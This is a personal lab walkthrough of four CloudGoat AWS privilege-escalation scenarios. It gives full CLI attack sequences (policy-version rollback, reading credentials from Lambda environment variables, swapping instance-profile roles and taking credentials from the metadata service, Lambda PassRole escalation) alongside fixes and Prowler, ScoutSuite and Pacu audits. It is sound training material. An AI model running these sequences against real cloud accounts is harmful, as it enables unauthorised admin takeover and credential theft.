# ⚔️ Attack Walkthrough — Har Scenario Step-by-Step

> This document is for future reference—exactly what was done, how it was done, and why it was done.

---

## 🔧 Setup

```bash
# Project folder
mkdir ~/Developer/red-team-lab
cd ~/Developer/red-team-lab

# CloudGoat clone + install
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
poetry install

# AWS lab profile configure 
aws configure --profile cloudgoat
# region: us-east-1

# CloudGoat configure 
poetry run cloudgoat config profile        # "cloudgoat" enter 
poetry run cloudgoat config whitelist --auto  # There will be an IP whitelist.
```

---

## Scenario 1 — `iam_privesc_by_rollback`

### Concept
IAM policies can have multiple versions (up to a maximum of 5). If an older version contains more permissions and the user has the `SetDefaultPolicyVersion` permission, they can upgrade themselves to that version.

### Deploy
```bash
poetry run cloudgoat create iam_privesc_by_rollback --profile cloudgoat
# Output: raynor_access_key_id, raynor_secret_access_key
```

### Attack Steps

```bash
# Step 1: Configure Victim profile 
aws configure --profile raynor
# (Enter the CloudGoat output keys)

# Step 2: Find your attached policy
aws iam list-attached-user-policies \
  --user-name raynor-<cgid> \
  --profile cloudgoat

# Step 3: Enumerate Policy versions 
aws iam list-policy-versions \
  --policy-arn <policy-arn> \
  --profile raynor

# Output: v1 (default), v2, v3, v4, v5

# Step 4: Check the permissions for each version
aws iam get-policy-version \
  --policy-arn <policy-arn> \
  --version-id v3 \
  --profile raynor

# v3 = Action:* Resource:* (FULL ADMIN!)

# Step 5: Set v3 as default (PRIVILEGE ESCALATION!)
aws iam set-default-policy-version \
  --policy-arn <policy-arn> \
  --version-id v3 \
  --profile raynor

# Step 6: Verify — Now, is the admin.
aws iam list-users --profile raynor   # ✅ Works!
aws s3 ls --profile raynor            # ✅ Works!
```

### What We Learned
- `iam:SetDefaultPolicyVersion` = dangerous permission
- If old policy versions aren't deleted, they become a time bomb.
- An attacker needs only one permission — rollback.

### Fix
```bash
# Delete the old versions
aws iam delete-policy-version \
  --policy-arn <arn> --version-id v3

# SetDefaultPolicyVersion permission not granted to non-admin users
```

### Cleanup
```bash
poetry run cloudgoat destroy iam_privesc_by_rollback --profile cloudgoat
```

---

## Scenario 2 — `ec2_ssrf`

### Concept
Developer credentials are sometimes stored in the environment variables of Lambda functions. Low-privilege users can also view these credentials through the `lambda:List Functions`.

### Deploy
```bash
poetry run cloudgoat create ec2_ssrf --profile cloudgoat
# Output: solus_access_key_id, solus_secret_key
```

### Attack Steps

```bash
# Step 1: Solus profile configure 
aws configure --profile solus
# (output keys)
# Region: us-east-1

# Step 2: Check Solus permissions (from the admin).
aws iam list-attached-user-policies \
  --user-name solus-<cgid> --profile cloudgoat
# Result: lambda:Get*, lambda:List* only

# Step 3: Lambda functions list 
aws lambda list-functions --profile solus --region us-east-1

# JACKPOT! Output:
# "EC2_ACCESS_KEY_ID": "AKIA..."
# "EC2_SECRET_KEY_ID": "..."

# Step 4: Stolen credentials configure
aws configure --profile ec2-stolen
# (Credentials obtained from Lambda)

# Step 5: Identity verification
aws sts get-caller-identity --profile ec2-stolen
# Returns: wrex user (ec2:* permissions)

# Step 6: Check out Wrex powers
aws iam get-policy-version \
  --policy-arn <wrex-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: ec2:* on Resource:*

# Step 7: Check the permissions of the EC2 instance role
aws iam list-attached-role-policies \
  --role-name cg-ec2-role-<cgid> --profile cloudgoat
# Result: s3:* + cloudwatch:*

# Step 8: Scenario complete — Lambda invoke 
aws lambda invoke \
  --function-name cg-lambda-<cgid> \
  --profile cloudgoat --region us-east-1 \
  --cli-binary-format raw-in-base64-out \
  output.txt && cat output.txt
```

### What We Learned
- Lambda env vars = publicly readable (by anyone with lambda:List/Get)
- Secrets Manager Do that, never enter credentials in env vars
- Enforce IMDSv2 only for SSRF prevention
- Overpermissive EC2 rolls are dangerous

### Fix
```bash
aws secretsmanager create-secret \
  --name prod/lambda/credentials \
  --secret-string '{"key":"...","secret":"..."}'

aws iam update-access-key \
  --access-key-id <key> --status Inactive
```

### Cleanup
```bash
poetry run cloudgoat destroy ec2_ssrf --profile cloudgoat
```

---

## Scenario 3 — `iam_privesc_by_attachment`

### Concept
If a user has `ec2:RunInstances`, `iam:PassRole`, and `iam:AddRoleToInstanceProfile` permissions, they can launch an EC2 instance with an admin role and steal admin credentials from the metadata service.

### Deploy
```bash
poetry run cloudgoat create iam_privesc_by_attachment --profile cloudgoat
# Output: kerrigan_access_key_id, kerrigan_secret_key
```

### Attack Steps

```bash
# Step 1: Kerrigan configure 
aws configure --profile kerrigan

# Step 2: Kerrigan policy
aws iam get-policy-version \
  --policy-arn <kerrigan-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: iam:AddRoleToInstanceProfile, iam:PassRole,
#         ec2:RunInstances, ec2:DescribeInstances, etc.

# Step 3: Enumerate available roles
aws iam list-roles --profile kerrigan \
  --query "Roles[?contains(RoleName, '<cgid>')].[RoleName]" \
  --output table
# Found: cg-ec2-meek-role (weak), cg-ec2-mighty-role (ADMIN!)

# Step 4: Instance profiles 
aws iam list-instance-profiles --profile kerrigan \
  --query "InstanceProfiles[?contains(InstanceProfileName, '<cgid>')]" \
  --output table
# Found: cg-ec2-meek-instance-profile

# Step 5: Meek role In, mighty role Out
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-<cgid> \
  --role-name cg-ec2-meek-role-<cgid> \
  --profile kerrigan

aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-<cgid> \
  --role-name cg-ec2-mighty-role-<cgid> \
  --profile kerrigan

# Step 6: Make the Key pair 
aws ec2 create-key-pair \
  --key-name kerrigan-attack-key \
  --profile kerrigan --region us-east-1 \
  --query "KeyMaterial" --output text \
  > ~/.ssh/kerrigan-attack-key.pem
chmod 400 ~/.ssh/kerrigan-attack-key.pem

# Step 7: Launch new EC2 with mighty role
aws ec2 run-instances \
  --image-id ami-0c02fb55956c7d316 \
  --instance-type t3.micro \
  --key-name kerrigan-attack-key \
  --subnet-id <cloudgoat-subnet> \
  --security-group-ids <cloudgoat-sg> \
  --iam-instance-profile Name="cg-ec2-meek-instance-profile-<cgid>" \
  --associate-public-ip-address \
  --profile kerrigan --region us-east-1

# Step 8: SSH in after receiving the EC2 IP
ssh -i ~/.ssh/kerrigan-attack-key.pem ec2-user@<public-ip>

# Step 9: Inside EC2 - Steal credentials from metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-mighty-role-<cgid>
# Returns: AccessKeyId, SecretAccessKey, Token

# Step 10: Come out and use your credentials
exit
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws iam list-users   # ✅ FULL ADMIN!
aws s3 ls            # ✅ Works!
```

### What We Learned
- `iam:PassRole` + `ec2:RunInstances` = privilege escalation primitive
- EC2 Instance Metadata Service (169.254.169.254) = magic IP
- IMDSv2 enforce (http-tokens=required)
- Least privilege for instance profiles

### Important Concept — IMDS
```
169.254.169.254 = AWS magic IP
Only accessible within EC2.
EC2's role, region, and credentials are found here.
IMDSv1 = directly accessible (dangerous)
IMDSv2 = token required first (safer)
```

### Fix
```bash
# IMDSv2 enforce karo
aws ec2 modify-instance-metadata-options \
  --instance-id <id> \
  --http-tokens required \
  --http-endpoint enabled

# PassRole permission restrict karo
```

### Cleanup
```bash
aws ec2 terminate-instances --instance-ids <id> --profile kerrigan
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
poetry run cloudgoat destroy iam_privesc_by_attachment --profile cloudgoat
```

---

## Scenario 4 — `lambda_privesc`

### Concept
If the user has `lambda:CreateFunction` + `iam:PassRole`, they can create a malicious Lambda function with the admin role as the execution role. Invoking Lambda requires admin credentials.

### Deploy
```bash
poetry run cloudgoat create lambda_privesc --profile cloudgoat
# Output: chris_access_key_id, chris_secret_key
```

### Attack Steps

```bash
# Step 1: Chris configure
aws configure --profile chris

# Step 2: Check chris policy
aws iam get-policy-version \
  --policy-arn <chris-policy-arn> \
  --version-id v1 --profile cloudgoat
# Result: sts:AssumeRole, iam:List*, iam:Get*

# Step 3: Roles enumeration
aws iam list-roles --profile chris \
  --query "Roles[?contains(RoleName, '<cgid>')]" --output table
# Found:
#   cg-debug-role (AdministratorAccess!) 
#   cg-lambdaManager-role (lambda:* + iam:PassRole)

# Step 4: Trying to assume the debug-role directly
aws sts assume-role \
  --role-arn <debug-role-arn> \
  --role-session-name test --profile chris
# ERROR: AccessDenied (only lambda.amazonaws.com)

# Step 5: Assume LambdaManager role
aws sts assume-role \
  --role-arn <lambdaManager-role-arn> \
  --role-session-name lambda-attack --profile chris

# Step 6: Set credentials LambdaManager 
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Step 7: Malicious Lambda code
cat > /tmp/lambda_payload.py << 'EOF'
import boto3, json

def handler(event, context):
    sts = boto3.client('sts')
    response = sts.get_caller_identity()
    return {
        'statusCode': 200,
        'body': json.dumps({
            'UserId': response['UserId'],
            'Arn': response['Arn']
        })
    }
EOF

cd /tmp && zip lambda_payload.zip lambda_payload.py

# Step 8: Lambda deploy with debug-role as execution role
aws lambda create-function \
  --function-name chris-attack-fn \
  --runtime python3.11 \
  --role <debug-role-arn> \
  --handler lambda_payload.handler \
  --zip-file fileb:///tmp/lambda_payload.zip \
  --region us-east-1

# Step 9: Lambda invoke 
aws lambda invoke \
  --function-name chris-attack-fn \
  --region us-east-1 \
  --cli-binary-format raw-in-base64-out \
  /tmp/output.txt && cat /tmp/output.txt
# Returns: assumed-role/cg-debug-role (AdministratorAccess!)
```

### What We Learned
- `lambda:CreateFunction` + `iam:PassRole` = dangerous combo
- Lambda execution role = We have got the permissions of Lambda and our role.
- Check Trust policy – which service can be assumed?
- This is AWS's most common production privilege escalation path.

### Fix
```bash
# Delete LAMBDA
aws lambda delete-function --function-name chris-attack-fn

# PassRole restrict karo specific resources pe
{
  "Action": "iam:PassRole",
  "Resource": "arn:aws:iam::*:role/specific-lambda-role-only"
}
```

### Cleanup
```bash
aws lambda delete-function --function-name chris-attack-fn --region us-east-1
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
poetry run cloudgoat destroy lambda_privesc --profile cloudgoat
```

---

## 🛡️ Defense Phase

### Prowler Scans
```bash
# IAM scan
prowler aws \
  --profile cloudgoat \
  --service iam \
  --severity critical high \
  --status FAIL \
  --output-formats html json-ocsf \
  --output-directory ./prowler-results \
  --region us-east-1

# EC2 + S3 scan
prowler aws \
  --profile cloudgoat \
  --service ec2 s3 \
  --output-formats html json-ocsf \
  --output-directory ./prowler-results \
  --region us-east-1
```

**Results:** 2 Critical, 39 High, 40 Medium, 18 Low = **99 total findings**

### ScoutSuite Audit
```bash
scout aws \
  --profile cloudgoat \
  --report-dir ./scoutsuite-report \
  --no-browser

# Open Report
open ./scoutsuite-report/aws-cloudgoat.html
```

### Pacu Automation
```bash
cd ~/Developer/red-team-lab/pacu
poetry run python cli.py

# Pacu shell mein:
set_regions us-east-1
import_keys cloudgoat
run iam__enum_users_roles_policies_groups
run iam__privesc_scan
# Result: 24 confirmed privilege escalation paths!
run ec2__enum
run secrets__enum
```

---

## 🔑 Most Important Commands — Quick Reference

```bash
# Identity check
aws sts get-caller-identity --profile <profile>

# IAM recon
aws iam list-attached-user-policies --user-name <user> --profile <p>
aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile <p>
aws iam list-roles --profile <p>

# Privilege escalation
aws iam set-default-policy-version --policy-arn <arn> --version-id v3 --profile <p>
aws iam add-role-to-instance-profile --instance-profile-name <n> --role-name <r> --profile <p>
aws sts assume-role --role-arn <arn> --role-session-name <name> --profile <p>

# EC2 recon
aws ec2 describe-instances --region us-east-1 --profile <p>
aws ec2 describe-iam-instance-profile-associations --profile <p>

# Lambda recon
aws lambda list-functions --profile <p> --region us-east-1
aws lambda get-function --function-name <name> --profile <p>

# Metadata (EC2 ke andar se)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# Temporary credentials use karna
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
# Clear karne ke liye:
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```
